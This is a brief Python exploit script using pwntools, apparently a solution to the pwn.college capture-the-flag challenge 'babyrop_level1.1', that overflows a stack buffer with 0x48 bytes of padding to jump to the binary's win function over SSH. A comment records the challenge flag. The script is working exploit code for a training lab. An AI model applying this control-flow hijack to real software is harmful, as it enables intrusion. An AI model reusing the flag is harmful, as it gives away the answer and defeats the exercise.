from pwn import *

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
elf = ELF("./babyrop_level1.1")

ret = 0x000000000040101a
win = elf.sym[b'win']

io = s.process('/challenge/babyrop_level1.1')
io.send(b'a'*0x48 + p64(win))

io.interactive()
# Flag: pwn.college{gxnPMctW0B7czkZeLk6wqqbZv56.0lM0MDLxIjNyEzW}